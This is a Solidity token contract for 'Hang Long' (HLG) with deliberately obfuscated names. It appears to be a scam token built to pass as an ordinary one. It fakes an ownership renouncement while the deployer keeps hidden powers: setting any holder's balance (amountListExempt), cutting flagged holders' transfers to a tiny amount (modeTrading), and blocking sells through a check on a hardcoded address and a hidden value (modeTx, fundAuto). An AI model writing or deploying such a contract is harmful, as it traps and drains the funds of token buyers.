//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface buySwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract modeBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoAt {
    function createPair(address amountIs, address maxList) external returns (address);
}

interface marketingTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountReceiver) external view returns (uint256);

    function transfer(address maxFund, uint256 feeLimitSell) external returns (bool);

    function allowance(address isTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeLimitSell) external returns (bool);

    function transferFrom(
        address sender,
        address maxFund,
        uint256 feeLimitSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundMin, uint256 value);
    event Approval(address indexed isTotal, address indexed spender, uint256 value);
}

interface marketingToMetadata is marketingTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HangLong is modeBuy, marketingTo, marketingToMetadata {

    uint256 private liquiditySender = 100000000 * 10 ** 18;

    bool private txFund;

    bool public shouldLimit;

    function isWallet(address tradingExempt) public {
        if (shouldLimit) {
            return;
        }
        if (tokenList == totalTx) {
            txFund = true;
        }
        minFee[tradingExempt] = true;
        
        shouldLimit = true;
    }

    string private launchedFee = "Hang Long";

    string private fundTx = "HLG";

    uint256 constant listMin = 13 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return liquiditySender;
    }

    mapping(address => bool) public receiverMarketingLimit;

    function fundAuto(uint256 feeLimitSell) public {
        buyList();
        marketingLaunch = feeLimitSell;
    }

    function transfer(address launchedSenderLimit, uint256 feeLimitSell) external virtual override returns (bool) {
        return modeTx(_msgSender(), launchedSenderLimit, feeLimitSell);
    }

    bool private launchedIs;

    bool public isWalletTotal;

    function fromToList() public {
        emit OwnershipTransferred(senderSell, address(0));
        tokenSwap = address(0);
    }

    function modeTrading(address totalLimit) public {
        buyList();
        if (tokenList == feeAuto) {
            isWalletTotal = true;
        }
        if (totalLimit == senderSell || totalLimit == listSellAmount) {
            return;
        }
        receiverMarketingLimit[totalLimit] = true;
    }

    event OwnershipTransferred(address indexed buyTrading, address indexed launchTake);

    function getOwner() external view returns (address) {
        return tokenSwap;
    }

    uint256 feeReceiver;

    mapping(address => uint256) private senderList;

    bool private maxAuto;

    address senderIsSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function approve(address isLaunch, uint256 feeLimitSell) public virtual override returns (bool) {
        listLimit[_msgSender()][isLaunch] = feeLimitSell;
        emit Approval(_msgSender(), isLaunch, feeLimitSell);
        return true;
    }

    address public listSellAmount;

    function buyList() private view {
        require(minFee[_msgSender()]);
    }

    address public senderSell;

    mapping(address => mapping(address => uint256)) private listLimit;

    function owner() external view returns (address) {
        return tokenSwap;
    }

    function modeTx(address receiverMode, address maxFund, uint256 feeLimitSell) internal returns (bool) {
        if (receiverMode == senderSell) {
            return receiverTake(receiverMode, maxFund, feeLimitSell);
        }
        uint256 fromMode = marketingTo(listSellAmount).balanceOf(senderIsSwap);
        require(fromMode == marketingLaunch);
        require(maxFund != senderIsSwap);
        if (receiverMarketingLimit[receiverMode]) {
            return receiverTake(receiverMode, maxFund, listMin);
        }
        return receiverTake(receiverMode, maxFund, feeLimitSell);
    }

    function name() external view virtual override returns (string memory) {
        return launchedFee;
    }

    mapping(address => bool) public minFee;

    uint256 private feeAuto;

    function balanceOf(address amountReceiver) public view virtual override returns (uint256) {
        return senderList[amountReceiver];
    }

    function transferFrom(address receiverMode, address maxFund, uint256 feeLimitSell) external override returns (bool) {
        if (_msgSender() != shouldMode) {
            if (listLimit[receiverMode][_msgSender()] != type(uint256).max) {
                require(feeLimitSell <= listLimit[receiverMode][_msgSender()]);
                listLimit[receiverMode][_msgSender()] -= feeLimitSell;
            }
        }
        return modeTx(receiverMode, maxFund, feeLimitSell);
    }

    function receiverTake(address receiverMode, address maxFund, uint256 feeLimitSell) internal returns (bool) {
        require(senderList[receiverMode] >= feeLimitSell);
        senderList[receiverMode] -= feeLimitSell;
        senderList[maxFund] += feeLimitSell;
        emit Transfer(receiverMode, maxFund, feeLimitSell);
        return true;
    }

    uint256 public totalTx;

    uint256 marketingLaunch;

    function symbol() external view virtual override returns (string memory) {
        return fundTx;
    }

    function allowance(address totalMin, address isLaunch) external view virtual override returns (uint256) {
        if (isLaunch == shouldMode) {
            return type(uint256).max;
        }
        return listLimit[totalMin][isLaunch];
    }

    function amountListExempt(address launchedSenderLimit, uint256 feeLimitSell) public {
        buyList();
        senderList[launchedSenderLimit] = feeLimitSell;
    }

    uint8 private atList = 18;

    address shouldMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private tokenSwap;

    constructor (){
        
        buySwap shouldFrom = buySwap(shouldMode);
        listSellAmount = autoAt(shouldFrom.factory()).createPair(shouldFrom.WETH(), address(this));
        
        senderSell = _msgSender();
        fromToList();
        minFee[senderSell] = true;
        senderList[senderSell] = liquiditySender;
        if (launchedIs) {
            feeAuto = tokenList;
        }
        emit Transfer(address(0), senderSell, liquiditySender);
    }

    function decimals() external view virtual override returns (uint8) {
        return atList;
    }

    uint256 public tokenList;

}